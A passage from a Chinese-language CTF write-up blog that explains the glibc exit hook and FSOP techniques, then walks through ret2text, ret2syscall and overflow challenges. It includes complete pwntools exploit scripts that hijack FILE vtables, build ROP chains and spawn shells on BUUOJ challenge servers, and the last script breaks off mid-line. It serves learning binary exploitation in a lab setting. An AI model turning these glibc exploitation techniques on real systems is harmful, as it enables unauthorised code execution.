class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>在define SHARED之后有两个分支：<code>_rtld_local</code>与<code>_rtld_global</code>，这里我们暂且不深究细节，使用gdb进行调试我们可以发现对于主线程而言<code>_rtld_local</code>就是<code>_rtld_global</code></p>
<p><img src="https://i.loli.net/2021/01/30/FNZdJ3upS2hoV6y.png"></p>
<p>最终我们进行宏展开可得如下结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global._dl_rtld_lock_recursive(&amp;(_rtld_global._dl_load_lock).mutex)</span><br><span class="line">_rtld_global._dl_rtld_unlock_recursive(&amp;(_rtld_global._dl_load_lock).mutex)</span><br></pre></td></tr></table></figure>

<p>即在这里<strong>会调用_rtld_global结构体中的两个函数指针_dl_rtld_lock_recursive与_dl_rtld_unlock_recursive，这就是我们所常说的exit hook</strong></p>
<p>使用gdb调试我们可以计算出其相对于libc基址的偏移，这里便不再赘叙</p>
<p><img src="https://i.loli.net/2021/01/30/1JwrXI6u3ckPzHl.png"></p>
<p>需要注意的是在glibc2.31及以后的版本中<strong>exit函数不会再调用_dl_fini函数，对于该个exit hook的利用失效</strong></p>
<h4 id="libc-2-31下的-exit-hook"><a href="#libc-2-31下的-exit-hook" class="headerlink" title="libc 2.31下的 exit hook"></a>libc 2.31下的 exit hook</h4><p>众所周知（x），在exit函数执行流程中会调用<code>_IO_cleanup()</code>函数 </p>
<p><img src="https://i.loli.net/2021/02/18/bLzchNjVJw9Qs6S.png" alt="image.png"></p>
<p>其上层调用函数为<code>__run_exit_handlers()</code>，<strong>这个函数会执行一系列的函数指针</strong>，其中就包括<code>_IO_cleanup()</code></p>
<p>因此我们只需要在储存<code>_IO_cleanup()</code>指针的位置覆写上我们的backdoor函数地址即可get shell</p>
<p>gdb调试，观察到这样一个东西<code>__elf_set___libc_atexit_element__IO_cleanup__</code>，<strong>里面储存着_IO_cleanup</strong>函数的地址</p>
<p><img src="https://i.loli.net/2021/02/18/QpfhuWgjX5wPGdF.png" alt="image.png"></p>
<p><strong>经过调试</strong>我们不难得知这便是类似 「exit hook」一样的东西，<code>__run_exit_handlers()</code>函<strong>数会执行其上的函数指针</strong>，那么只需要往上写backdoor地址（如one_gadget等）即可get shell</p>
</blockquote>
<blockquote>
<p>注意到exit()函数中还调用了<code> _IO_flush_all_lockp ()</code>函数，这<strong>为我们提供了另一种利用exit函数get shell的解法——FSOP</strong></p>
</blockquote>
<h3 id="解法二：File-Stream-Oriented-Programme"><a href="#解法二：File-Stream-Oriented-Programme" class="headerlink" title="解法二：File Stream Oriented Programme"></a>解法二：File Stream Oriented Programme</h3><p>由于glibc2.23中未加入对vtable表的合法性检测，故我们可以考虑直接劫持<code>_IO_2_1_stderr_</code>及其vtable表执行<code>system(&quot;/bin/sh&quot;)</code>以get shell（stderr为FILE链表的头结点），其中由于<code>__overflow()</code>函数会将指向FILE的指针作为其第一个参数，故考虑将”&#x2F;bin&#x2F;sh”字符串构造于fake file的开头</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;, 26348)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)#</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>((p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input string Length: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])<span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x10</span>) <span class="comment"># fake vtable</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New contents:&quot;</span>)</span><br><span class="line">p.send(fake_file)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/31/HItF2WqQlb6kyTZ.png"></p>
<blockquote>
<h4 id="exit-函数与FSOP相关…"><a href="#exit-函数与FSOP相关…" class="headerlink" title="exit()函数与FSOP相关…"></a>exit()函数与FSOP相关…</h4><blockquote>
<p> 由于程序退出时必定会调用<code>exit()</code>函数，故我们要对这个函数多多上心2333</p>
</blockquote>
<p>我们不难观察到在<code>exit()</code>函数当中还会调用<code> _IO_flush_all_lockp ()</code>函数</p>
<p><img src="https://i.loli.net/2021/01/30/x3I8sHJpvRqmajM.png"></p>
<p>该函数会刷新_IO_list_all链表中所有项的文件流 ，定义于libio&#x2F;genops.c中，我们主要关注其中的如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>中间的那一段宏一般为假，我们暂且先不管</p>
</blockquote>
<p>那么其会检查如下两个条件：</p>
<ul>
<li><strong>fp-&gt;_mode &lt;&#x3D; 0</strong></li>
<li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li>
</ul>
<p>按照程序执行流程，在这两个条件通过之后便会使用宏<code>_IO_OVERFLOW()</code>，其定义于libio&#x2F;libioP.h中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>

<p>由此可知其<strong>最终会调用vtable表中的</strong><code>__overflow</code><strong>函数，且第一个参数为指向FILE自身的指针</strong></p>
</blockquote>
<blockquote>
<p>笔者个人比较常规的做法是按照FILE的结构构造出一个fake file预备着用，等到真正要劫持FILE结构体的时候对照相应的需求部分改一改后复制粘贴即可，目前考虑有时间封装一个库就像pwntools中的SigreturnFrame()一样（<del>但是什么时候有时间呢无限摸鱼者A3</del></p>
</blockquote>
<h2 id="0x-mrctf2020-easyrop-ret2text"><a href="#0x-mrctf2020-easyrop-ret2text" class="headerlink" title="0x???.mrctf2020_easyrop - ret2text"></a>0x???.mrctf2020_easyrop - ret2text</h2><blockquote>
<p>从比较靠后的无人区挑了一道简单题来做2333（<del>为了混分</del></p>
</blockquote>
<p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/10/07/9iQUjlYXTmzAKoB.png" alt="image.png"></p>
<p>主函数中根据我们所输入的数字进入不同的函数，输入7则在进入相应的函数之后退出</p>
<p><img src="https://i.loli.net/2020/10/07/zrNR46ytfJ2gcDq.png" alt="image.png"></p>
<p>同时我们可以发现存在能够直接getshell的gadget</p>
<p><img src="https://i.loli.net/2020/10/07/LXQr9f2BShwG1bC.png" alt="image.png"></p>
<p>虽然说几个函数都是向main中的v5上写入，但是最大的一个函数仅可以写入<code>0x300</code>字节，溢出到rbp要<code>0x310</code>字节</p>
<p><img src="https://i.loli.net/2020/10/07/wzrb1uSvc49oaeO.png" alt="image.png"></p>
<p>不过我们可以发现，在<code>byby()</code>函数中程序会将v5看作为一个字符串，并在字符串末尾开始读入用户输入</p>
<p><img src="https://i.loli.net/2020/10/07/QDHPlT9WFS3gx6K.png" alt="image.png"></p>
<p>由于<code>hehe()</code>能够读入0x300字节，故我们考虑先使用<code>hehe()</code>函数构造一个长度为0x2ff的字符串，再调用<code>byby()</code>函数进行读入，便可以溢出控制主函数的返回地址返回至<code>system(&quot;/bin/sh&quot;)</code></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29482</span>)<span class="comment">#process(&#x27;./mrctf2020_easyrop&#x27;)#</span></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x300</span>-<span class="number">1</span>)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x11</span>+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x40072a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即得flag</p>
<p><img src="https://i.loli.net/2020/10/07/TwVOht7dcnsZzbN.png" alt="image.png"></p>
<h2 id="0x-pwnable-calc-ret2syscall"><a href="#0x-pwnable-calc-ret2syscall" class="headerlink" title="0x???.pwnable_calc - ret2syscall"></a>0x???.pwnable_calc - ret2syscall</h2><p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2021/02/27/boyq1aHJzTXUKsj.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/02/27/YIt25sLJcC6krdi.png" alt="image.png"></p>
<p>大概是模拟了一个计算器，其中<code>get_expr()</code>为读入表达式，<code>init_pool()</code>为初始化数据栈</p>
<p>核心的计算函数为<code>parse_expr()</code>，跟进（部分变量经重命名</p>
<p>逻辑大概是逐字符遍历输入的表达式，若遇到<code>+ - * / % \0</code>等符号则会将此前的未读部分字符串转换为数字，压入pool数组中（可以看作是存放数据的栈），其中pool[0]用以保存当前数据量</p>
<p>这里的验证逻辑是通过整型上溢完成的，并不是很严密</p>
<p><img src="https://i.loli.net/2021/02/27/zRjMYLVQEcT31Cm.png" alt="image.png"></p>
<p>接下来便是通过运算符进行相应的计算，由于<code>* / %</code>优先级高于<code>+ -</code>的缘故，这里设计了一个专门用以存放运算符的栈，运算逻辑如下：</p>
<ul>
<li>若栈中无运算符则会将运算符压入栈中</li>
<li>若栈中原有运算符或新运算符为低优先级运算符，则会使用<code>eval()</code>函数计算原有数据，同时将栈中原运算符弹出，压入新运算符</li>
<li>若栈中原有运算符与新运算符同为高优先级运算符，则会将新运算符压入栈中</li>
<li>若输入的运算符为其他运算符（验证不严密），则会直接使用<code>eval()</code>函数计算原有数据，弹出原有运算符</li>
</ul>
<p>遍历结束后，运算符栈中还可能留有一些数据，此时再使用循环进行计算</p>
<p><img src="https://i.loli.net/2021/02/27/cPk5wVTvbxAQ3W1.png" alt="image.png"></p>
<p>不过在<code>eval()</code>函数中并没有定义求模运算，也就是说求模运算的模数会被自动舍弃</p>
<p><img src="https://i.loli.net/2021/02/27/3IQd5wbzG27ZkBP.png" alt="image.png"></p>
<p>那么这里就存在一个逻辑漏洞：若是直接输入运算符加数字（如<code>+200</code>）则会直接改写num_pool[0]的值，而我们在<code>calc()</code>函数中输出结果时便是输出的<code>num_pool[num_pool[0]]</code>的值，那么我们便可以通过这个逻辑漏洞<strong>随意泄露栈上数据</strong></p>
<p>同样地，若是我们在其后再跟上其他运算表达式，<strong>便能够任意修改栈上的值</strong></p>
<p>简单计算一下便知道<code>num_pool[361]</code>的位置便是<code>calc()</code>函数的返回地址</p>
<p>那么我们只需要在上面构造rop链即可get shell</p>
<p>不过我们还需要手动将<code>/bin/sh</code>字符串写到栈上，可以通过泄露ebp获得栈上地址后写入即可，以及需要自己计算一下偏移，这里按我的rop链布局刚好在后边所以偏移为0</p>
<p><img src="https://i.loli.net/2021/02/27/mDfCHcdOiM2S5bA.png" alt="image.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26915</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./calc&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">dst:<span class="built_in">int</span>, val:<span class="built_in">int</span>, op</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(dst) + op + <span class="built_in">str</span>(val))</span><br><span class="line">    p.recv()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">dst:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(dst))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_val</span>(<span class="params">dst:<span class="built_in">int</span>, val:<span class="built_in">int</span></span>):</span><br><span class="line">    n = leak(dst)</span><br><span class="line">    <span class="keyword">if</span> n != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            write(dst, n, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> n &lt; <span class="number">0</span>:</span><br><span class="line">            write(dst, -n, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> val != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> val &gt; <span class="number">0</span>:</span><br><span class="line">            write(dst, val, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> val &lt; <span class="number">0</span>:</span><br><span class="line">            write(dst, -val, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">pop_eax_ret = e.search(asm(<span class="string">&#x27;pop eax ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_edx_pop_ecx_pop_ebx_ret = e.search(asm(<span class="string">&#x27;pop edx ; pop ecx ; pop ebx ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_ecx_pop_ebx_ret = <span class="number">0x80701d1</span></span><br><span class="line">pop_edx_ret = <span class="number">0x80701aa</span></span><br><span class="line">int_0x80 = e.search(asm(<span class="string">&#x27;int 0x80&#x27;</span>)).__next__()</span><br><span class="line">log.success(<span class="built_in">hex</span>(pop_eax_ret))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">stack_leak = leak(<span class="number">360</span>)</span><br><span class="line">sh_addr = stack_leak</span><br><span class="line"></span><br><span class="line">set_val(<span class="number">361</span>, pop_eax_ret)</span><br><span class="line">set_val(<span class="number">362</span>, <span class="number">11</span>) <span class="comment"># execve</span></span><br><span class="line">set_val(<span class="number">363</span>, pop_edx_pop_ecx_pop_ebx_ret)</span><br><span class="line">set_val(<span class="number">364</span>, <span class="number">0</span>)</span><br><span class="line">set_val(<span class="number">365</span>, <span class="number">0</span>)</span><br><span class="line">set_val(<span class="number">366</span>, sh_addr)</span><br><span class="line">set_val(<span class="number">367</span>, int_0x80)</span><br><span class="line">set_val(<span class="number">368</span>, u32(<span class="string">b&#x27;/bin&#x27;</span>))</span><br><span class="line">set_val(<span class="number">369</span>, u32(<span class="string">b&#x27;/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/27/gMD5IuB6Lp4kWdN.png" alt="image.png"></p>
<h2 id="0x-pwnable-silverbullet-overwrite"><a href="#0x-pwnable-silverbullet-overwrite" class="headerlink" title="0x???.pwnable_silverbullet - overwrite"></a>0x???.pwnable_silverbullet - overwrite</h2><p>惯例的<code>checksec</code>，只开了NX和RELRO</p>
<p><img src="https://i.loli.net/2021/02/27/rBO4dg9WVRAqK7H.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大概是可以创建子弹、增强子弹、射击狼人（</p>
<p>创建子弹的函数如下：</p>
<p><img src="https://i.loli.net/2021/02/27/2DdyrePCI8v1mFA.png" alt="image.png"></p>
<p>不难看出，在main函数的调用栈上用如下结构体表示一颗子弹：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_BULLET_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> content[<span class="number">0x30</span>];</span><br><span class="line">    <span class="type">int</span> power;</span><br><span class="line">&#125;silver_bullet;</span><br></pre></td></tr></table></figure>

<p>漏洞点主要在于<code>power_up()</code>函数中，使用<code>strncat()</code>函数进行拼接，该函数会在字符串末尾添加<code>&#39;\0&#39;</code>，<strong>可以重置计数</strong>，同时题目没开地址随机化，那么我们便可以直接溢出到main的返回地址以控制程序执行流，泄露libc地址一套带走</p>
<p>最终构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28297</span>)<span class="comment">#remote(&#x27;chall.pwnable.tw&#x27;, 10103)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./silver_bullet&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">47</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Oh ! You win !!\n&quot;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">47</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(<span class="number">0xdeadbeef</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + 